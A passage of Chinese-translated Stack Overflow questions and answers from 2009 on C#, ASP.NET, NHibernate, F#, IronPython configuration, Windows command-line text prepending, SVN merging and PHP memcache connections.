*   如果您只需要进行一些串联，并且您真的想在单独的语句中执行它们，那么您走哪条路并不重要。哪种方式更有效将取决于所涉及的字符串大小的连接数量以及它们连接的顺序。如果您真的认为那段代码是性能瓶颈，请以两种方式对其进行分析或基准测试。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2009-02-15T11:10:11.857

有时值得查看[文档](http://msdn.microsoft.com/en-us/library/system.text.stringbuilder.aspx)：

> String 或 StringBuilder 对象的连接操作的性能取决于内存分配发生的频率。String 连接操作总是分配内存，而 StringBuilder 连接操作仅在 StringBuilder 对象缓冲区太小而无法容纳新数据时才分配内存。因此，如果串联固定数量的 String 对象，则 String 类更适合串联操作。在这种情况下，编译器甚至可以将各个连接操作组合成一个操作。如果串联任意数量的字符串，则 StringBuilder 对象更适合串联操作；例如，如果一个循环连接随机数量的用户输入字符串。

在您的示例中，每个输出字符串只有一个连接，因此 StringBuilder 不会为您带来任何好处。在您多次添加到*同一个字符串*的情况下，您应该使用 StringBuilder ，例如：

```
stringOut = ...
for(...)
    stringOut += "."
    stringOut += string2 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-02-15T13:22:01.870

我的经验法则很简单。

1.  如果您可以合理地编写一个生成最终结果的表达式，则使用`+`.
2.  如果不能（由于大小或可变性），请使用 StringBuilder。

根据我的经验，表达方式如下：

```
"Id: " + item.id + " name: " + item.name 
```

可以比以下内容更容易编写和理解：

```
StringBuilder sb = new StringBuilder();
sb.append("Id: ").append(item.id);
sb.append(" name: ").append(item.name); 
```

（然后使用`sb`上面的表达式编写的字符串），并且它的性能同样好（提示：查看编译后的代码以了解原因！）

另一方面，当需要随着时间（程序运行时）或空间（由来自代码不同部分的值组成）累积字符串时，以单行表达式不切实际的方式，然后 StringBuilder 避免了以下开销（时间和内存搅动）：

```
String s = somethingExpression;
...
s += someOtherExpression;
...
s += yetAnotherExpression;
... 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-02-15T11:11:53.790

来自[MSDN](http://msdn.microsoft.com/en-us/library/system.text.stringbuilder.aspx)：

> [T] 如果串联固定数量的 String 对象，则 String 类更适合串联操作。在这种情况下，编译器甚至可以将各个连接操作组合成一个操作。如果串联任意数量的字符串，则 StringBuilder 对象更适合串联操作；例如，如果一个循环连接随机数量的用户输入字符串。

我想答案是“它取决于” - 如果你在一个循环中连接多个迭代，那么 StringBuilder 几乎总是会提供更好的性能，但唯一确定的方法是实际分析。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-02-15T11:15:37.650

在[Coding Horror](http://www.codinghorror.com/blog/archives/001218.html)上有一篇有趣的文章。Jeff 在双核 3.5 GHz Core 2 Duo 上进行 100,000 次迭代得到以下结果：

```
 Simple Concatenation    - 606 ms
 String.Format           - 665 ms
 string.Concat           - 587 ms
 String.Replace          - 979 ms
 StringBuilder           - 588 ms 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-02-15T12:01:38.130

来自[点网 Perls](http://dotnetperls.com/Content/StringBuilder-Performance.aspx)：

何时使用 StringBuilder？

StringBuilder 完全是一种优化，除了内部实现之外，它对字符串 Concat 没有任何逻辑改进。也就是说，在您的高性能应用程序和网站中正确使用它至关重要。

有时，可以使用简单的字符串 Concats 使用 4 次或更少迭代的小循环。然而，在极端情况下，这可能是灾难性的。使用 StringBuilder 计划您的边缘情况。

# c# - C#：“+= anEvent”和“+= new EventHandler(anEvent)”之间的区别

> ID：550703
> 
> 赞同：78
> 
> 时间：2009-02-15T10:55:46.573
> 
> 标签：c#, delegates, event-handling

采取以下代码：

```
private void anEvent(object sender, EventArgs e) {
    //some code
} 
```

* * *

以下 和有什么区别？

```
[object].[event] += anEvent;

//and

[object].[event] += new EventHandler(anEvent); 
```

**[更新]**

显然，两者之间没有区别……前者只是后者的语法糖。

* * *

## 回答 #1

> 赞同：83
> 
> 时间：2009-02-15T10:59:03.087

没有区别。在您的第一个示例中，编译器将自动推断您要实例化的委托。在第二个示例中，您明确定义了委托。

在 C# 2.0 中添加了委托推理。因此，对于 C# 1.0 项目，第二个示例是您唯一的选择。对于 2.0 项目，使用推理的第一个示例是我更喜欢在代码库中使用和查看的示例 - 因为它更简洁。

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2009-02-15T11:01:23.143

```
[object].[event] += anEvent; 
```

只是语法糖-

```
[object].[event] += new EventHandler(anEvent); 
```

* * *

## 回答 #3

> 赞同：11
> 
> 时间：2009-02-15T10:58:40.997

我不认为有区别。编译器将第一个转换为第二个。

# nhibernate - 休眠和历史表

> ID：550706
> 
> 赞同：1
> 
> 时间：2009-02-15T10:58:40.153
> 
> 标签：nhibernate, wiki, input-history

我正在使用 Nhibernate 作为我的 ORM 的 ASP.NET MVC 网站。该项目类似于维基/博客引擎，并要求在编辑页面时将编辑历史存储在另一个表中，然后可以查看和恢复。这有点复杂，因为每个“页面”都可以有与之关联的集合，也可以编辑/添加/删除。我还需要存储这些更改。

我想知道这如何适合 Nhibernate 等实体映射场景以及如何实现。如果有人知道这方面的任何文章，或者自己做过，请告诉我。

我正在考虑触发器，但如果可能的话，我不希望混合使用数据访问技术。我也在使用 MySql，所以 CDC 对我来说是不可能的。

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-02-15T13:26:16.227

要么[实现审计拦截器](http://www.codeproject.com/KB/cs/NHibernate_IInterceptor.aspx?display=Print)，要么使用[事件系统](http://nhforge.org/doc/nh/en/index.html#objectstate-events)。事件系统较新，我还没有找到任何审计示例......

另请参阅[此相关问题](https://stackoverflow.com/questions/15917/data-auditing-in-nhibernate-and-sqlserver)：

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-03-23T15:30:16.577

看看 NHibernate.Envers [https://bitbucket.org/RogerKratz/nhibernate.envers](https://bitbucket.org/RogerKratz/nhibernate.envers)

# sql - 使用 VB.NET 从文本框中拆分文本字符串

> ID：550714
> 
> 赞同：1
> 
> 时间：2009-02-15T11:03:17.617
> 
> 标签：sql, vb.net, split

我想在网页上添加一个文本框，以便用户添加空格分隔的标签。当用户提交页面时，如何从文本框中取出标签并将每个标签添加为 SQL 数据库中的记录？

我想使用 VB.NET。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-02-15T11:34:23.640

听起来你想要这样的东西：

```
Using connection as New SqlConnection("connection string")
    connection.Open()

    For Each tag As String In TextBox.Split(CChar(" "))
        Using command as New SqlCommand("INSERT INTO UsedTags(Tag) VALUES(@Tag)", connection)
            command.Parameters.Add("@Tag", SqlDbType.varchar).value = tag

            Try
                command.ExecuteNonQuery()
            Catch ex As SqlException
                Debug.WriteLine(ex.ToString())
            End Try
        End Using
    End For
End Using 
```

未经测试，但应该足够接近您的需求。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-15T11:35:00.770

我的方法是将文本框中的值发送到 SQL 存储过程，将文本拆分，然后插入各个行。

所有这些都将是基于集合的，所以非常快。

如果您在 VB.NET 中将其拆分并将单个 INSERT 语句发送到 SQL，则会慢得多。

您可以将文本框分隔的数据转换为 XML 并将其发送到 SQL，并将其用作 INSERT 语句的基础。但我个人认为在 SQL 中拆分它是更可取的。

~~我给你找个链接~~

我没有很容易找到一个可行的例子，所以这里有一个建议

```
INSERT INTO UsedTags
(
    Tag
)
SELECT SplitValue
FROM dbo.MySplitFunction(@ListOfTags) 
```

有关推荐的 SPLIT 函数，请参见[http://www.sqlteam.com/forums/topic.asp?TOPIC_ID=50648](http://www.sqlteam.com/forums/topic.asp?TOPIC_ID=50648)

如果您只想直接从 VB.NET 进行 INSERT，您可以执行以下操作：

```
INSERT INTO UsedTags
(
    Tag
)
SELECT "Tag1"
UNION ALL
SELECT "Tag2" 
```

即，您在 VB.NET 中生成复合 SELECT 语句，并拆分了分隔标记字符串。

（如果可能有重复的标签，并且您想删除重复的标签，请使用“UNION”而不是“UNION ALL”）

# c# - F# 中的事件和委托

> ID：550716
> 
> 赞同：6
> 
> 时间：2009-02-15T11:03:57.240
> 
> 标签：c#, .net, f#

我没有任何 F# 经验，但在 C# 中有几行测试代码，用于我制作的框架，需要用 F# 重写。

任何帮助，将不胜感激。

```
 bar.Ready += new Agent.ReadyHandler(bar_Ready);               

    static void bar_Ready(string msg)
    {    
       Console.WriteLine(msg.body);  
    } 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2009-02-16T20:47:59.153

只是为了澄清 - 较短的版本应该正确地是：

```
bar.Ready.Add(fun msg -> System.Console.WriteLine(msg)) 
```

因为 F# 不会自动将 lambda 函数转换为委托 - 但有一个 Add 方法接受一个函数。然后可以像这样更简单地编写：

```
bar.Ready.Add(System.Console.WriteLine) 
```

因为 F# 允许您将 .NET 成员用作一等函数。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2009-02-15T11:54:26.433

试试这个 -

```
bar.Ready.AddHandler(new Agent.ReadyHandler (fun sender msg -> System.Console.WriteLine(msg))) 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2009-02-17T00:03:36.093

我已经玩了很多，这是有效的代码。

```
bar.add_Ready(fun msg -> Console.WriteLine(msg)) 
```

我不知道它在理论上有多正确，但它工作正常。

任何人都可以确认它是正确的吗？

# ironpython - 如何将 IronPython 与 App.Config 一起使用？

> ID：550723
> 
> 赞同：21
> 
> 时间：2009-02-15T11:15:11.643
> 
> 标签：ironpython

我有一个通常从 .net 控制台或 Web 应用程序调用的类库。它与各种组件集成，并依赖于 app.config 或 web.config。

如果我想利用脚本中的类库（即 IronPython），我怎样才能让脚本利用配置文件？理想情况下，我希望能够在运行脚本时选择配置文件，或者按照惯例（配置文件位于脚本文件旁边）。

如果可能的话，我不想更改 ipy.exe.config，因为如果没有多个 IronPython 副本，这将无法扩展到多个配置？

有什么选择吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-01-09T09:08:15.517

我有一个带有代码示例的工作解决方案。请参阅我的博客： [http ://technomosh.blogspot.com/2012/01/using-appconfig-in-ironpython.html](http://technomosh.blogspot.com/2012/01/using-appconfig-in-ironpython.html)

它需要一个注入到 ConfigurationManager 的特殊代理类。

这是 ConfigurationProxy 库的源代码：

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Configuration;
using System.Configuration.Internal;
using System.Xml;
using System.Collections.Specialized;
using System.Reflection;
using System.IO;

namespace IronPythonUtilities
{
    /// <summary>
    /// A custom app.config injector for use with IronPython code that needs configuration files.
    /// The code was taken and modified from the great work by Tom E Stephens:
    /// http://tomestephens.com/2011/02/making-ironpython-work-overriding-the-configurationmanager/
    /// </summary>
    public sealed class ConfigurationProxy : IInternalConfigSystem
    {
        Configuration config;
        Dictionary<string, IConfigurationSectionHandler> customSections;

        // this is called filename but really it's the path as needed...
        // it defaults to checking the directory you're running in.
        public ConfigurationProxy(string fileName)
        {
            customSections = new Dictionary<string, IConfigurationSectionHandler>();

            if (!Load(fileName))
                throw new ConfigurationErrorsException(string.Format(
                    "File: {0} could not be found or was not a valid cofiguration file.",
                    config.FilePath));
        }

        private bool Load(string file)
        {
            var map = new ExeConfigurationFileMap { ExeConfigFilename = file };
            config = ConfigurationManager.OpenMappedExeConfiguration(map, ConfigurationUserLevel.None);

            var xml = new XmlDocument();
            using (var stream = new FileStream(file, FileMode.Open, FileAccess.Read))
                xml.Load(stream);

            //var cfgSections = xml.GetElementsByTagName("configSections");

            //if (cfgSections.Count > 0)
            //{
            //    foreach (XmlNode node in cfgSections[0].ChildNodes)
            //    {
            //        var type = System.Activator.CreateInstance(
            //                             Type.GetType(node.Attributes["type"].Value))
            //                             as IConfigurationSectionHandler;

            //        if (type == null) continue;

            //        customSections.Add(node.Attributes["name"].Value, type);
            //    }
            //}

            return config.HasFile;
        }

        public Configuration Configuration
        {
            get { return config; }
        }

        #region IInternalConfigSystem Members

        public object GetSection(string configKey)
        {
            if (configKey == "appSettings")
                return BuildAppSettings();

            object sect = config.GetSection(configKey);

            if (customSections.ContainsKey(configKey) && sect != null)
            {
                var xml = new XmlDocument();

                xml.LoadXml(((ConfigurationSection)sect).SectionInformation.GetRawXml());
                // I have no idea what I should normally be passing through in the first
                // two params, but I never use them in my confighandlers so I opted not to
                // worry about it and just pass through something...
                sect = customSections[configKey].Create(config,
                                       config.EvaluationContext,
                                       xml.FirstChild);
            }

            return sect;
        }

        public void RefreshConfig(string sectionName)
        {
            // I suppose this will work. Reload the whole file?
            Load(config.FilePath);
        }

        public bool SupportsUserConfig
        {
            get { return false; }
        }

        #endregion

        private NameValueCollection BuildAppSettings()
        {
            var coll = new NameValueCollection();

            foreach (var key in config.AppSettings.Settings.AllKeys)
                coll.Add(key, config.AppSettings.Settings[key].Value);

            return coll;
        }

        public bool InjectToConfigurationManager()
        {
            // inject self into ConfigurationManager
            var configSystem = typeof(ConfigurationManager).GetField("s_configSystem",
                                            BindingFlags.Static | BindingFlags.NonPublic);
            configSystem.SetValue(null, this);

            // lame check, but it's something
            if (ConfigurationManager.AppSettings.Count == config.AppSettings.Settings.Count)
                return true;

            return false;
        }
    }
} 
```

以下是如何从 Python 加载它：

```
import clr
clr.AddReferenceToFile('ConfigurationProxy.dll')

from IronPythonUtilities import ConfigurationProxy

def override(filename):
    proxy = ConfigurationProxy(filename)
    return proxy.InjectToConfigurationManager() 
```

最后，一个使用示例：

```
import configproxy
import sys

if not configproxy.override('blogsample.config'):
    print "could not load configuration file"
    sys.exit(1)

import clr
clr.AddReference('System.Configuration')
from System.Configuration import *
connstr = ConfigurationManager.ConnectionStrings['TestConnStr']
print "The configuration string is {0}".format(connstr) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-02-26T04:15:02.453

你可以看看[`System.Configuration.ConfigurationManager`](http://msdn.microsoft.com/en-us/library/system.configuration.configurationmanager.aspx)类。更具体地说，[`OpenMappedExeConfiguration`](http://msdn.microsoft.com/en-us/library/system.configuration.configurationmanager.openmappedexeconfiguration.aspx)方法将允许您加载您选择的任何 .config 文件。这将为您提供一个[`Configuration`](http://msdn.microsoft.com/en-us/library/system.configuration.configuration.aspx)公开标准 AppSettins、ConnectionStrings、SectionGroups 和 Sections 属性的对象。

这种方法要求您将配置文件的名称作为命令行参数传递给脚本，或者具有代码逻辑以在运行时选择 .config 文件。

我不知道 Python，所以我会避免尝试发布示例代码。:-)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-15T11:36:40.937

[将此博客文章](http://weblogs.asp.net/israelio/archive/2005/01/10/349825.aspx)翻译成 Python，这应该可以工作：

```
import clr
import System.AppDomain
System.AppDomain.CurrentDomain.SetData(“APP_CONFIG_FILE”, r”c:\your\app.config”) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-02-16T16:36:52.517

您始终可以在配置文件中包含其他部分。在您的 ipy.exe.config 文件中，您可以添加一个包含以导入外部配置设置；说 myApp.config。

在批处理/命令文件中，您始终可以将特定的 .config 集复制到 myApp.config 中，因此可以根据需要使用不同的配置文件运行。

看看这个博客如何实现这一点； [http://weblogs.asp.net/pwilson/archive/2003/04/09/5261.aspx](http://weblogs.asp.net/pwilson/archive/2003/04/09/5261.aspx)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2010-01-08T21:59:10.170

对于解决方法，我所做的是“手动”填充 ConfigurationManager 静态类的 AppSettings 集合，因此我创建了一个 PY 脚本并在 IronPython 上运行它的“导入”，然后这些设置将可用于类库。但是我可以为 ConnectionStrings 集合赋值:(

我的脚本看起来像这样

```
import clr
clr.AddReferenceToFileAndPath(r'c:\WINDOWS\Microsoft.NET\Framework\v2.0.50727\System.configuration.dll')
from System.Configuration import *
ConfigurationManager.AppSettings["settingA"] = "setting A value here"
ConfigurationManager.AppSettings["settingB"] = "setting B value here" 
```

不过，如果知道一种将自定义 .config 文件“加载”到 ConfigurationManager 类的方法，那就太好了。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2017-08-10T22:11:05.327

我试图遵循上面的答案，但发现它太复杂了。如果您从 App.config 文件中确切知道需要什么属性，则可以将其直接放在代码中。例如，我导入的 dll 需要知道 App.Config 文件中的 AssemblyPath 属性。

```
import clr
import System.Configuration
clr.AddReference("System.Configuration")
from System.Configuration import ConfigurationManager

ConfigurationManager.AppSettings["AssemblyPath"] = 'C:/Program Files (X86)/... 
```

这就是我所需要的，我连接的类库能够看到它需要运行的 AssemblyPath 属性。

# asp.net - 重定向到 ASP.Net 中的另一个 URL 问题

> ID：550724
> 
> 赞同：1
> 
> 时间：2009-02-15T11:15:31.987
> 
> 标签：asp.net, redirect

我有两个 Web 应用程序，有时我需要用户从一个应用程序跳转到另一个应用程序。由于它们是两个 Web 应用程序并且可能驻留在不同的域/机器上，因此我无法在它们之间共享会话。

对我来说，技术挑战是如何将会话信息（我只需要在会话中传递 userID 字符串信息）从一个源应用程序传递到另一个目标应用程序——让用户感觉到单点登录并为他显示个人信息/她在两个应用程序中（因为用户 ID 被传递到目标应用程序，不需要重新登录）。

我当前的解决方案是在两个应用程序中生成所有 URL 字符串，并在用户成功登录后附加用户 ID，例如[http://www.anotherapplication.com/somepage?userID=someuserID](http://www.anotherapplication.com/somepage?userID=someuserID)，从会话中检索用户 ID 值。但是我认为我的解决方案很愚蠢，我想找到一些方法来在用户跳转到另一个应用程序中的另一个 URL 时自动附加查询字符串 ?userID=someuserID -- 这样我只需要生成通用的统一 URL [http:/ /www.anotherapplication.com/somepage](http://www.anotherapplication.com/somepage)在两个应用程序中。

是否有自动附加用户 ID 查询字符串的解决方案？

提前谢谢，乔治

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-02-15T11:29:06.570

如果您使用创建具有所需值的 FormsAuthenticationTicket，从长远来看，它可能更易于维护，而不是通过 Querystring 进行。

我特别推荐阅读 Michael Morozov关于 SSO（单点登录）主题的[优秀文章。](http://blogs.neudesic.com/blogs/michael_morozov/archive/2006/03/17/72.aspx)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-02-15T11:29:28.223

我认为在查询字符串中包含用户 ID 不是一个好主意。

一个更好的主意是实施单点登录解决方案。在您的场景中，您可以执行以下操作：

*   每当您的一个应用程序收到未经身份验证的请求时，将用户重定向回另一个应用程序到一个特殊的单点登录 url。
*   此页面检查用户是否已登录，如果是，则使用查询字符串中的身份验证令牌重定向回来。
*   该令牌由未经身份验证的应用程序检查；如果通过，您可以登录用户。

当然，这看起来像是“很多”重定向，但它应该是可靠的，并且只发生一次，然后您的用户将在两个应用程序上都经过身份验证。

显然，您需要实现一个安全方案，以便您可以检查您获得的身份验证令牌是否真的有效并且来自您的其他应用程序。您可以使用质询-响应算法来做到这一点；这可能是：

*   两个应用程序都应该知道一个公共密钥。
*   第一个应用程序向第二个应用程序发送一些随机数据（“挑战”）。
*   第二个应用程序在其响应中包含随机数据的哈希值 + 它的答案 + 密钥。
*   现在第一个应用程序可以通过计算相同的哈希值来检查第二个应用程序是否知道密钥。

看看： [http ://en.wikipedia.org/wiki/Challenge-response_authentication](http://en.wikipedia.org/wiki/Challenge-response_authentication)

**编辑：**

关于会话状态，请参阅[http://msdn.microsoft.com/en-us/library/ms178581.aspx](http://msdn.microsoft.com/en-us/library/ms178581.aspx)以获得概述。可以在应用程序之间共享会话状态，但我一般不建议这样做。如果您的应用程序驻留在不同的域 (URL) 上，您将不得不使用无 cookie 会话状态；这是不安全的。如果您决定采用这种方式，您将不得不使用状态服务器或 SQL Server 进行会话持久性，具体取决于您的设置。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-15T11:24:57.063

您可以使用除 InProc（进程中的缩写）以外的其他东西来保持会话。如果您使用 SQL Server 后端保持会话，如果它们设置为使用相同的 SQL Server 后端进行会话存储，您将能够跨域/机器检索会话。这可以在 ASP.NET 中进行配置，并且支持开箱即用。我建议你查一下。

# windows - 在命令行 (Windows) 中将文本添加到另一个文本文件开头的最简单方法

> ID：550728
> 
> 赞同：37
> 
> 时间：2009-02-15T11:17:30.657
> 
> 标签：windows, command-line, text-files

在命令行（Windows）中将文本添加到另一个文本文件开头的最简单方法是什么？

* * *

## 回答 #1

> 赞同：54
> 
> 时间：2009-02-15T11:23:06.820

```
echo "my line" > newFile.txt
type myOriginalFile.txt >> newFile.txt
type newFile.txt > myOriginalFile.txt 
```

未经测试。双 >> 表示“追加”

* * *

## 回答 #2

> 赞同：23
> 
> 时间：2013-11-20T22:24:52.260

主题的另一种变化。

```
(echo New Line 1) >file.txt.new
type file.txt >>file.txt.new
move /y file.txt.new file.txt 
```

与其他已发布答案相比的优势：

*   最少步数
*   没有剩余临时文件
*   括号防止在第一行出现不需要的尾随空格
*   移动命令“立即”用新版本替换旧版本
*   原始文件保持不变，直到它被替换的最后一刻
*   最终内容只写入一次 - 如果文件很大，则可能很重要。

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2009-02-15T12:18:21.040

以下序列将执行您想要的操作，将“ `new first line`”行添加到`file.txt`文件中。

```
ren file.txt temp.txt
echo.new first line>file.txt
type temp.txt >>file.txt
del temp.txt 
```

注意回声的结构。" `echo.`" 允许您在必要时在行首放置空格，并且与 " `>`" 重定向字符相邻可确保没有尾随空格（当然，除非您想要它们）。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2012-11-30T18:11:39.213

以下也将起作用：

```
echo "my line" > newFile.txt
type newfile.txt myOriginalFile.txt > myOriginalFile.txt 
```

在第一行中，您将我的行写入 newfile.txt。在第二行中，您将替换 myOriginalFile.txt 中的文本，方法是用 newfile.txt 和 myOriginalFile.txt 中的文本覆盖它，创建一个包含两者的新 myOriginalFile.txt。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2016-12-29T00:45:08.650

如果可以对行的第一部分进行排序，例如日期/时间，则使用 SORT /R 命令将最近的条目放在文件的顶部。下面将以“YYYY-MM-DD HH:DD:SS AM/PM”的形式在每行的开头放置一个日期/时间戳：

```
echo %DATE:~-4%-%DATE:~7,2%-%DATE:~4,2% %TIME% "my text line" >> myOriginalFile.txt
sort /R myOriginalFile.txt /O myOriginalFile.txt 
```

但是，随着文件变得非常大，这种方法（以及上面的方法）变得很慢。仅在需要时才考虑排序，而不是对每个条目进行排序 - 或使用另一种脚本/编程语言

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2019-05-03T01:20:15.530

通过 PowerShell；

```
@("NEW Line 1","NEW Line 2") + (Get-Content "C:\Data\TestFile.txt") | Set-Content "C:\data\TestFile.txt" 
```

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2019-07-15T09:42:47.960

如果您想处理更大的文件，则接受的解决方案会变得非常慢。然后使用带有“+”的副本更快

```
echo "my line" > newFile.txt
copy newFile.txt+myOriginalFile.txt combinedFile.txt
move /Y combinedFile.txt myOriginalFile.txt
del newFile.txt 
```

# svn - 如何针对这种情况制作/应用差异补丁？

> ID：550736
> 
> 赞同：3
> 
> 时间：2009-02-15T11:23:05.540
> 
> 标签：svn, diff, patch

我有一个项目，例如 WORDPRESS。我正在使用SVN。

我有以下副本：

A. 来自 wordpress.org 的 WP2.6

B. WP2.6，我修改了一些核心文件（add/del/change some files' code）

C. 来自 wordpress.org 的 WP2.7

我想将版本 A 更新为 C 并保留版本 B 的更改。

我的一些更改可能是这样的：

版本 A 代码：

```
123 123 
```

版本 B 代码：

```
123 x 123 
```

C版代码：

```
123 123 123 
```

预期的最终版本：

```
123 x 123 123 
```

我怎样才能为这个项目制作/应用补丁？如果我有 100 多个不同的文件，任何更快/更简单的方法

也许我想错了。请建议改正。谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-02-15T11:39:17.670

（简单的回答）：没有全自动的方法来做到这一点——你需要分支和合并，合并意味着你必须查看你的修改，并测试它们。

1.  从 (A) 作为 /trunk 开始，检入您的工作副本
2.  为 WP2.6 创建一个“供应商”分支
3.  将 (B) 复制到后备箱中。注意 svn rm 和 svn mv 删除和重命名的文件，并提交到主干
4.  将工作副本切换到 (A)-WP2.6 分支
5.  将 (C) 复制到这个分支中（同样，如果需要，不要忘记 svn mv 和 svn rm），然后提交
6.  将工作副本切换回主干
7.  从 WP2.6 供应商分支合并回主干（这是大部分艰苦工作的地方）
8.  在提交到后备箱之前，以您需要的任何程度的信心对其进行测试
9.  重复未来的版本

* * *

为了说明通常无法自动解决的那种困难，请考虑一下：在您的示例中，希望的最终版本可能是以下任何一种：

```
123 x 123 123
123 123 x 123 
```

# asp.net - asp.net gridview 的问题

> ID：550741
> 
> 赞同：0
> 
> 时间：2009-02-15T11:26:27.233
> 
> 标签：asp.net, sql, gridview, identity

我在删除gridview时遇到问题。我有带有Id，Name，Address，Phone的表名Doctor。Id是自动生成的字段。在我在gridview中显示时添加数据后，如果再次从gridview中删除任何id，那么如果我添加任何新的表格中的详细信息从新数字开始。我的意思是，如果我删除最后一个 id 号 5，那么如果我添加任何新医生，它的 id 值 6 而不是从 5 开始。我的查询是它应该从 5 重新开始。这里是我的代码。请帮助我。

```
public class Doctor
{  
  public int Id { get; set; }
  public string Name { get; set; }
  public string Address { get; set; }
  public string Phone { get; set; }
}

public static class DoctorDataLayer
{
  public static void AddDoctor(Doctor doctor) 
  {
    string connectionString = ConfigurationManager.ConnectionStrings["ConnectionString"].ConnectionString; // JohannesH: Changed from .ToString() to .ConnectionString
    using(var connection = new SqlConnection(connectionString))
    {
      using (var command = new  SqlCommand("insert into doctor values(@name,@address,@phone)", connection))
      {      
        command.Parameters.AddWithValue("@name", doctor.Name);
        command.Parameters.AddWithValue("@address", doctor.Address);
        command.Parameters.AddWithValue("@phone", doctor.Phone);
        connection.Open();
        command.ExecuteNonQuery();
        connection.Close();
      }
    }
  }
}
public static class DoctorBusinessLayer
{
  public static void CreateDoctor(string name, string address, string phone) 
  {
    DoctorDataLayer.AddDoctor(new Doctor {Name = name, Address = address, Phone = phone});
  }
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-02-15T11:43:54.350

这是完全正常的数据库行为，与您的 GridView 无关。如果您对自动生成的（身份）列中的空白有疑问，请使用您自己的逻辑来生成唯一 ID，或使用自定义 SQL 脚本来检查身份值中的空白并填补这些空白。

[Transact-SQL 参考](http://msdn.microsoft.com/en-us/library/ms186775.aspx)中的示例 B显示了执行此操作的方法。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-15T11:36:56.740

所以 Id 是由数据库创建的（自动编号）。当 id 5 被使用时，它就用完了。这是正常行为。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-02-15T12:46:30.113

正如其他人所指出的，如果这是来自数据库的自动生成的 ID，那么一旦使用它就不会重新生成，每个 ID 都是唯一的，无论数据是否仍然存在。如果 ID 被回收，您可能会遇到外部引用的问题，这些引用可能指向具有该 ID 的旧项目，现在将指向具有重用 ID 的新的不同记录。

通常，您不会向用户公开 ID，因此这不是问题。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-02-15T12:48:05.727

您不应该依赖自动生成的 ids 序列被排序或没有间隙。正如其他人所指出的那样，您看到的行为对于自动生成的 id 来说是完全正常的行为，否则您将需要跳过很多圈。如果您需要按插入顺序对 id 进行排序，则应放入一个自动生成的日期/时间字段，然后选择按该字段排序的数据（并对其进行索引）。这样，如果您决定从数字 id 切换到 GUID 或其他排序顺序与插入顺序不同的 id 格式，您的数据仍将正确排序。如果您需要为每个“下订单”，请在您选择按日期排序时自动生成（例如行号）。

# c# - 在工作组的情况下，如何在远程计算机上授予 Windows 服务访问权限？

> ID：550742
> 
> 赞同：2
> 
> 时间：2009-02-15T11:26:34.893
> 
> 标签：c#, security, windows-services

我正在开发一项 Windows 服务，它的任务之一是在远程机器上归档文件，但是在工作组的情况下我有一个关于访问权限的问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-02-15T12:19:48.463

最简单的方法是在两台机器上镜像用户名和密码，在两台机器上创建相同的帐户，然后在该帐户下运行您的服务。由于您在工作组而不是域中，因此远程登录将起作用，但是一旦您在不再起作用的域中。

您不能使用任何内置服务帐户（网络服务、本地服务、本地系统）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-02-15T11:45:47.373

您可以在具有远程计算机访问权限的用户帐户下运行它。

或者您可以在访问远程计算机时使用模拟。对于模拟，您将需要可以访问远程计算机的用户名和密码。在此处查找有关在.net [http://blogs.msdn.com/shawnfa/archive/2005/03/22/400749.aspx中模拟的一些代码](http://blogs.msdn.com/shawnfa/archive/2005/03/22/400749.aspx)

# php - 在 PHP 中的函数之间共享变量而不使用全局变量

> ID：550753
> 
> 赞同：5
> 
> 时间：2009-02-15T11:33:57.933
> 
> 标签：php, oop, global

我有一个与 memcache 服务器交互的类。我有不同的功能来插入、删除和检索数据。最初每个函数都会调用`memcache_connect()`，但是这是不必要的，例如：

```
mc->insert()  
mc->get()  
mc->delete() 
```

将建立三个 memcache 连接。我通过为该类创建一个构造来解决此问题：

```
function __construct() {
    $this->mem = memcache_connect( ... );
} 
```

然后`$this->mem`在需要资源的地方使用，因此三个函数中的每一个都使用相同的`memcache_connect`资源。

没关系，但是如果我在其他类中调用该类，例如：

```
class abc
{
    function __construct() {
        $this->mc = new cache_class;
    }
}    
class def
{
    function __construct() {
        $this->mc = new cache_class;
    }
} 
```

那么它仍然在打两个`memcache_connect`电话，而它只*需要*一个。

我可以用全局变量来做到这一点，但如果我不需要，我宁愿不使用它们。

全局变量实现示例：

```
$resource = memcache_connect( ... );

class cache_class
{
    function insert() {
        global $resource;
        memcache_set( $resource , ... );
    }
    function get() {
        global $resource;
        return memcache_get( $resource , ... );
    }

} 
```

那么无论该类被调用多少次，都只会调用一次`memcache_connect`。

有没有办法做到这一点，或者我应该只使用全局变量？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2009-02-15T11:41:56.587

我将使用单例模式编写另一个类来获取内存缓存的唯一实例。像这样 -

```
class MemCache 
{ 
  private static $instance = false;   
